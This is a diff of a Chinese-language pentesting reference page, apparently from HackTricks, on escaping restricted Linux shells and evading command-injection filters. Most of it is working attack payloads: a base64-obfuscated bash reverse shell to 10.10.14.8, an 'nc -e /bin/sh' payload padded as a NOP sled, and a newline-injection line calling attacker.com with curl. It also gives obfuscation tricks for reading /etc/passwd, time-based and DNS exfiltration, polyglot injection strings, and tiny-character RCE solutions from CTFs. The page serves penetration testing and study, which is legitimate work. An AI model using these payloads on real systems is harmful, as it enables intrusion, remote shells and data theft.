@@ -4,15 +4,20 @@
 
 ## 常见限制绕过
 
-PayloadsAllTheThings、Bo0oM 的 cheat sheet 以及所链接的两篇 Secjuice 文章，为本节中的 shell 语法变体提供了背景资料。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+PayloadsAllTheThings、Bo0oM 的 cheat sheet，以及两个链接的 Secjuice 文章中的命令注入和 WAF 规避内容，为本节介绍的 shell 语法变体提供了背景知识。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+
+如需识别 shell sink 并确认盲执行，请参阅 [Command Injection](../../../pentesting-web/command-injection.md)。
 
 ### Reverse Shell
+
 ```bash
 # Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### 简短的 Rev shell
+
+### 短小 Rev shell
+
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -20,7 +25,9 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### 绕过路径和禁止词
+
+### Bypass 路径与禁用词
+
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -80,7 +87,9 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### 绕过禁止的空格
+
+### 绕过被禁止的空格
+
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -107,47 +116,73 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass 反斜杠和斜杠
+
+### 绕过反斜杠和斜杠
+
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass 管道
+
+### Bypass pipes
+
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### 使用 hex encoding 绕过
+
+### 使用十六进制编码绕过限制
+
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
 `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### 绕过 IP 限制
+
+### 使用八进制引用构造无字母命令名
+
+Bash 的 ANSI-C `$'...'` 引用会在构造命令词时解码八进制转义序列。<sup>[[7]](#references)</sup>
+
+因此，如果字母 denylist 仍允许 `$`、单引号、反斜杠、数字和命令分隔符，就可能失效。这不能绕过作为正确引用的数据参数传入的输入。<sup>[[13]](#references)</sup>
+
+在这个本地测试中，`:` 代表前面的命令，`\151\144` 会解码为 `id`。<sup>[[7]](#references)</sup> 如果有可用的词分隔符，参数可以编码为独立的词。<sup>[[13]](#references)</sup>
+
+```bash
+:;$'\151\144'
+```
+
+### Bypass IPs
+
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
+
 ### 基于时间的数据外传
+
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
+
 ### 从环境变量中获取字符
+
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
+
 ### DNS 数据外传
 
-对于带外回调，类似 Burp Collaborator 的 collaborator-style 服务可以诱导目标应用与外部服务器交互；现有的 [**pingb**](http://pingb.in) 链接保留用于历史导航，不代表当前可用性声明。<sup>[[6]](#references)</sup>
+对于带外回调，Burp Collaborator 这类 collaborator 服务可以诱使目标应用与外部服务器交互；现有的 [**pingb**](http://pingb.in) 链接仅作为历史导航保留，并不表示该服务目前可用。<sup>[[6]](#references)</sup>
 
-### 内置命令
+### Builtins
 
-在受限 shell 中，可用的内置命令是这些示例的剩余命令面；Bash 对其内置命令和执行语法进行了说明。<sup>[[7]](#references)</sup> 灵感来自 [**devploit**](https://twitter.com/devploit)。\
-从现有的 [**shell 内置命令**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 导航开始，然后尝试以下 Bash-specific 技术：<sup>[[7]](#references)</sup>
+在受限 shell 中，可用的 builtins 是这些示例剩余的命令接口；Bash 文档介绍了其 builtin 命令和执行语法。<sup>[[7]](#references)</sup> 灵感来自 [**devploit**](https://twitter.com/devploit)。\
+从现有的 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 导航开始，然后尝试以下 Bash 专属技巧：<sup>[[7]](#references)</sup>
+
 ```bash
 # Get list of builtins
 declare builtins
@@ -199,26 +234,34 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
+
 ### Polyglot command injection
+
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
+
 ### 绕过潜在的正则表达式
+
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
+
 ### Bashfuscator
 
-以下调用使用了 Bashfuscator，这是一个开源的 Bash 混淆框架；代码注释中的 repository 链接保留用于导航。<sup>[[8]](#references)</sup>
+以下命令使用 Bashfuscator，这是一个开源 Bash 混淆框架；代码注释中的仓库链接保留作导航用途。<sup>[[8]](#references)</sup>
+
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5 个字符的 RCE
 
-以下两个历史上的 5 字符示例作为挑战复现保留：主要挑战 repository 可在 [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges) 获取，而代码块中的第二个 write-up 链接仅用于导航，其当前可用性未经验证。<sup>[[9]](#references)</sup>
+### 使用 5 个字符实现 RCE
+
+以下两个历史上的 5 字符示例作为挑战复现保留：主要挑战仓库可在 [Orange Tsai 的仓库](https://github.com/orangetw/My-CTF-Web-Challenges) 中找到，而代码块中的第二个 write-up 链接仅用于导航，其当前可用性未经验证。<sup>[[9]](#references)</sup>
+
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -265,7 +308,9 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### 使用 4 个字符的 RCE
+
+### 使用 4 个字符实现 RCE
+
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -300,52 +345,58 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Read-Only/Noexec/Distroless Bypass
 
-如果你位于具有 **只读和 noexec 保护** 的文件系统中，或处于 **distroless image** 中，环境会施加由 Linux `mount(8)` 和 Distroless project 记录的执行限制；链接页面汇总了在这些限制下工作的 techniques。<sup>[[11]](#references)[[12]](#references)</sup>
+## 只读/Noexec/Distroless 绕过
+
+如果你处于启用了**只读和 noexec 保护**的文件系统中，或处于**distroless 镜像**中，环境会施加执行限制，这些限制记录在 Linux `mount(8)` 手册和 Distroless 项目文档中；链接页面汇集了在这些限制下操作的技巧。<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Chroot 与其他 Jail 绕过
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Space-Based Bash NOP Sled ("Bashsledding")
+## 基于空格的 Bash NOP Sled（“Bashsledding”）
 
-当某个 vulnerability 允许你部分控制一个最终传递给 `system()` 或其他 shell 的 argument 时，payload offset 可能并不确定。Alan Cao 和 Will Tan 描述了一种受限 embedded-device 场景：将 shell payload spray 到 memory-mapped NVRAM 中，并在其前面添加空格。<sup>[[5]](#references)</sup>
+当漏洞允许你部分控制一个最终传递给 `system()` 或其他 shell 的参数时，payload 的偏移量可能不确定。Alan Cao 和 Will Tan 描述了一种受限的嵌入式设备场景：他们将 shell payload 喷射到内存映射的 NVRAM 中，并在前面加上空格。<sup>[[5]](#references)</sup>
 
-因此，你可以通过在真实 command 前添加一长串空格或制表符，为 Bash 创建一个 *NOP sled*；Bash 将空格和制表符定义为在 simple command 中分隔 words 的 blanks。<sup>[[5]](#references)[[7]](#references)</sup>
+因此，你可以为 *Bash* 创建一个 *NOP sled*：在实际命令前加上一长串空格或制表符；Bash 将空格和制表符定义为简单命令中用于分隔单词的空白字符。<sup>[[5]](#references)[[7]](#references)</sup>
+
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-如果 ROP chain（或其他 memory-corruption primitive）传递的 command-string pointer 从 space block 内的任意位置开始，Bash 就可以解析剩余的前导空格，直到到达 command；在所引用的 router exploit 中，这使不确定的字符串偏移量变得可用。<sup>[[5]](#references)[[7]](#references)</sup>
 
-在受限的 embedded targets 中，实际使用场景包括：<sup>[[5]](#references)</sup>
+如果 ROP chain（或其他内存破坏原语）传入的命令字符串指针指向空格块中的任意位置，Bash 都可以解析剩余的前导空格，直到遇到命令；在引用的路由器 exploit 中，这使得不确定的字符串偏移量也能使用。<sup>[[5]](#references)[[7]](#references)</sup>
 
-1. **Memory-mapped configuration blobs**（例如 NVRAM），可跨进程访问。<sup>[[5]](#references)</sup>
-2. Payload channels，在这些通道中，attacker 无法写入 NULL bytes 来对齐 payload（这是对 alignment problem 的一般性适配）。<sup>[[5]](#references)</sup>
-3. 配备小型 BusyBox `ash`/`sh` environment 的 embedded devices；BusyBox 将其记录为 resource-constrained systems 中的 applets。<sup>[[10]](#references)</sup>
+在受限的嵌入式目标中，实际应用场景包括：<sup>[[5]](#references)</sup>
 
-> 🛠️ 在受控 lab 中，将此 technique 与调用 `system()` 的 ROP gadgets 结合使用；所引用的 router research 展示了这一组合在受限 hardware 上的应用。<sup>[[5]](#references)</sup>
+1. **内存映射的配置 blob**（例如 NVRAM），可供多个进程访问。<sup>[[5]](#references)</sup>
+2. 攻击者无法写入 NULL 字节来对齐 payload 的 payload 通道（这是对齐问题的一种通用变体）。<sup>[[5]](#references)</sup>
+3. 使用精简 BusyBox `ash`/`sh` 环境的嵌入式设备；BusyBox 将其文档列为资源受限系统中的 applet。<sup>[[10]](#references)</sup>
+
+> 🛠️  在受控实验环境中，将此技术与调用 `system()` 的 ROP gadgets 结合使用；引用的路由器研究展示了这种组合在受限硬件上的应用。<sup>[[5]](#references)</sup>
+
+
 
 ## References
 
-- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — 在废弃 hardware 中利用 zero days – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - 命令注入](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF 绕过速查表](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web 应用防火墙（WAF）规避技术 #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web 应用防火墙（WAF）规避技术 #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao 和 Will Tan — 利用废弃硬件中的零日漏洞 – Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
+- [13] [Dojo CTF #36：Shell Escape writeup — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
 {{#include ../../../banners/hacktricks-training.md}}
